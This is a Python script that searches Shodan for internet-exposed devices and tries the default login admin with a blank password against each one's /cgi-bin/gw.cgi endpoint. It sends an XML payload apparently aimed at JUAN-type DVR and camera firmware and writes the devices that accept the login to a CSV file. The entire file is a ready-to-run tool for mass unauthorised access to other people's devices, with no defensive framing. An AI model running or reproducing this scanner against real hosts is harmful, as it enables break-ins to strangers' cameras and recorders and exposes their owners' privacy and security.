
import os
from dotenv import load_dotenv
import shodan
import requests
import csv

# Load environment variables
load_dotenv()

SHODAN_API_KEY = os.getenv("SHODAN_API_KEY")

COMMON_CREDENTIALS = [
    ("admin", ""),
]

def search_shodan(query):
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        results = api.search(query)
        print(f"Found {len(results['matches'])} devices matching the query.")
        return results['matches']
    except shodan.APIError as e:
        print(f"Shodan API error: {e}")
        return []

def check_credentials(ip, port, username, password):
    base_url = f"http://{ip}:{port}"
    url = f"{base_url}/cgi-bin/gw.cgi"
    xml_payload = f'<juan ver="" squ="" dir="0"><rpermission usr="{username}" pwd="{password}"><config base=""/><playback base=""/></rpermission></juan>'
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{base_url}",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    params = {'xml': xml_payload, '_': '1733796544482'}
    try:
        response = requests.get(url, params=params, headers=headers, timeout=5)
        resp_text = response.text
        if 'errno="4"' in resp_text:
            return False
        elif 'errno="0"' in resp_text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False

def main():
    query = input("Enter your Shodan query: ").strip()
    if not query:
        print("No query provided. Exiting...")
        return

    devices = search_shodan(query)
    results = []
    for device in devices:
        ip = device['ip_str']
        port = device.get('port', 80)
        for username, password in COMMON_CREDENTIALS:
            if check_credentials(ip, port, username, password):
                results.append((ip, port, username, password, "success"))
                break
        else:
            results.append((ip, port, "", "", "fail"))

    csv_filename = "results.csv"
    with open(csv_filename, "w", newline="", encoding="utf-8") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["IP", "Port", "Username", "Password", "Status"])
        writer.writerows(results)

if __name__ == "__main__":
    main()
